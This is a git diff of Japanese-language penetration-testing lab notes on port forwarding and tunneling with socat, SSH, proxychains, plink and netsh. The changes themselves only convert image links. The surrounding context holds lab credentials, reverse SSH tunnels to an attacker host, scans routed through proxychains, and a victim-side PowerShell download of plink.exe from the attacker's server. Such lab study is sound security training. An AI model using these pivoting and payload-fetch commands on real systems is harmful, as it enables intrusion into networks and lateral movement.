@@ -11,7 +11,7 @@ nav_order: 3
 ```
 
 
-![](assets/images/Pasted%20image%2020250719214437.png)
+![[Pasted image 20250719214437.png]]
 
 - Kali 192.168.45.195
 - CONFULENCE01 192.168.162.63
@@ -55,7 +55,7 @@ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
 ```
 
 ## Socatによるポート転送
-![](../../assets/images/Pasted%20image%2020260508223742.png)
+![[Pasted image 20260508223742.png]]
 
 ### Socat の起動
 
@@ -75,17 +75,17 @@ D@t4basePassw0rd!
 
 \l
 ```
-![](../../assets/images/Pasted%20image%2020260508223719.png)
+![[Pasted image 20260508223719.png]]
 
 ```bash
 \c confluence
 ```
-![](../../assets/images/Pasted%20image%2020260508223723.png)
+![[Pasted image 20260508223723.png]]
 
 ```bash
 select * from cwd_user;
 ```
-![](../../assets/images/Pasted%20image%2020260508223710.png)
+![[Pasted image 20260508223710.png]]
 
 ## Password_Crack
 ```bash
@@ -146,7 +146,7 @@ sqlpass123
 
 https://github.com/PowerShell/Win32-OpenSSH/releases
 # SSHローカルポート転送
-![](../../assets/images/Pasted%20image%2020260508223842.png)
+![[Pasted image 20260508223842.png]]
 
 `Kali`
 
@@ -190,7 +190,7 @@ sqlpass123
 #接続を確認したい場合は別のリバースシェルを確立し以下のコマンドを打ち込む
 ss -ntplu
 ```
-![](../../assets/images/Pasted%20image%2020260508223916.png)
+![[Pasted image 20260508223916.png]]
 
 `Kali`
 
@@ -234,7 +234,7 @@ Flag: "OS{}"
 ---
 
 # SSHダイナミックポートフォワーディング
-![](../../assets/images/Pasted%20image%2020260508223940.png)
+![[Pasted image 20260508223940.png]]
 この柔軟性を活用するには、使用するソフトウェアが正しいSOCKSプロトコル形式でパケットを送信できることを確認する必要があります。
 ## 初期侵入
 Kali
@@ -261,14 +261,14 @@ tail /etc/proxychains4.conf
 sudo cp /etc/proxychains.conf /etc/proxychains.conf.bak
 sudo vi /etc/proxychains.conf
 ```
-![](../../assets/images/Pasted%20image%2020260508223951.png)
+![[Pasted image 20260508223951.png]]
 
 ## Proxychain
 ### smb接続
 ```bash
 proxychains smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
 ```
-![](../../assets/images/Pasted%20image%2020260508223959.png)
+![[Pasted image 20260508223959.png]]
 
 ## nmap
 
@@ -291,11 +291,11 @@ chmod 777 218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client
 
 sudo proxychains ./218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client -i 172.16.158.217 -p4872
 ```
-![](../../assets/images/Pasted%20image%2020260508224016.png)
+![[Pasted image 20260508224016.png]]
 
 ---
 #  SSHリモートポート転送
-![](../../assets/images/Pasted%20image%2020260508224025.png)
+![[Pasted image 20260508224025.png]]
 
 ## SSH Server
 ```bash
@@ -303,7 +303,7 @@ sudo systemctl start ssh
 
 sudo ss -ntplu
 ```
-![](../../assets/images/Pasted%20image%2020260508224035.png)
+![[Pasted image 20260508224035.png]]
 
 ユーザー名とパスワードを使用して Kali SSH サーバーに接続するには、/etc/ssh/sshd_configで PasswordAuthentication をyesに設定して、パスワードベースの認証を明示的に許可する必要がある場合があります。
 
@@ -328,7 +328,7 @@ Kali
 ```
 ss -ntplu
 ```
-![](../../assets/images/Pasted%20image%2020260508224045.png)
+![[Pasted image 20260508224045.png]]
 ## Database Access
 kali
 ```bash
@@ -337,14 +337,14 @@ D@t4basePassw0rd!
 
 \l
 ```
-![](../../assets/images/Pasted%20image%2020260508224055.png)
+![[Pasted image 20260508224055.png]]
 ## Lab1
 ```bash
 \c hr_backup
 
 select * from payroll;
 ```
-![](../../assets/images/Pasted%20image%2020260508224102.png)
+![[Pasted image 20260508224102.png]]
 
 ## Lab2
 ```bash
@@ -356,16 +356,16 @@ chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client
 
 ./2e345e06246bd4465204327a6d6892a5-ssh_remote_client -p 2345
 ```
-![](../../assets/images/Pasted%20image%2020260508224111.png)
+![[Pasted image 20260508224111.png]]
 
 ---
 ---
 
 # SSHリモートダイナミックポートフォワーディング
-![](../../assets/images/Pasted%20image%2020260508224146.png)
+![[Pasted image 20260508224146.png]]
 リモートダイナミックポートフォワーディングは、2017年10月のOpenSSH 7.6以降でのみ利用可能になりました。ただし、この機能を使用するにはOpenSSHクライアントのバージョンが7.6以上である必要があります。サーバーのバージョンは関係ありません。
 
-![](../../assets/images/Pasted%20image%2020260508224153.png)
+![[Pasted image 20260508224153.png]]
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -373,7 +373,7 @@ ssh -N -R 9998 kali@192.168.45.236
 
 tail /etc/proxychains.conf
 ```
-![](../../assets/images/Pasted%20image%2020260508224201.png)
+![[Pasted image 20260508224201.png]]
 
 ```bash
 proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64
@@ -381,14 +381,14 @@ proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64
 #nmapがダメな時の代替手段
 proxychains -q nc -zv 10.4.158.64 9000-9100 -w 3
 ```
-![](../../assets/images/Pasted%20image%2020260508224206.png)
+![[Pasted image 20260508224206.png]]
 ## Lab
 ```bash
 chmod 777 ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client
 
 proxychains ./ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client -i 10.4.158.64 -p 9062
 ```
-![](../../assets/images/Pasted%20image%2020260508224212.png)
+![[Pasted image 20260508224212.png]]
 
 ---
 
@@ -418,7 +418,7 @@ Terminal03
 ```bash
 smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
 ```
-![](../../assets/images/Pasted%20image%2020260508224221.png)
+![[Pasted image 20260508224221.png]]
 
 ---
 ---
@@ -442,7 +442,7 @@ smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
 %systemdrive%\Windows\System32\OpenSSH
 ```
 
-![](../../assets/images/Pasted%20image%2020260508224312.png)
+![[Pasted image 20260508224312.png]]
 
 Kali
 ```bash
@@ -482,9 +482,9 @@ D@t4basePassw0rd!
 ## 02_Plink
 *PuTTYのコマンドラインツール
 
-![](../../assets/images/Pasted%20image%2020260508224428.png)
+![[Pasted image 20260508224428.png]]
 *シナリオでは事前にターゲットにwebshellを蔵置済
-![](../../assets/images/Pasted%20image%2020260508224433.png)
+![[Pasted image 20260508224433.png]]
 
 Kali
 ```bash
@@ -519,7 +519,7 @@ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
 ```
 
 ### Port3389をKaliのループバックに転送
-![](../../assets/images/Pasted%20image%2020260508224448.png)
+![[Pasted image 20260508224448.png]]
 Victim
 ```cmd
 powershell wget -Uri http://192.168.45.206/plink.exe -OutFile C:\Windows\Temp\plink.exe
@@ -540,7 +540,7 @@ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
 ## 03_Netsh
 - *標準搭載されているファイアウォール設定ツール
 - *Netshを使用してポートフォワードを作成するには管理者権限が必要*
-![](../../assets/images/Pasted%20image%2020260508224458.png)
+![[Pasted image 20260508224458.png]]
 
 Kali
 ```bash
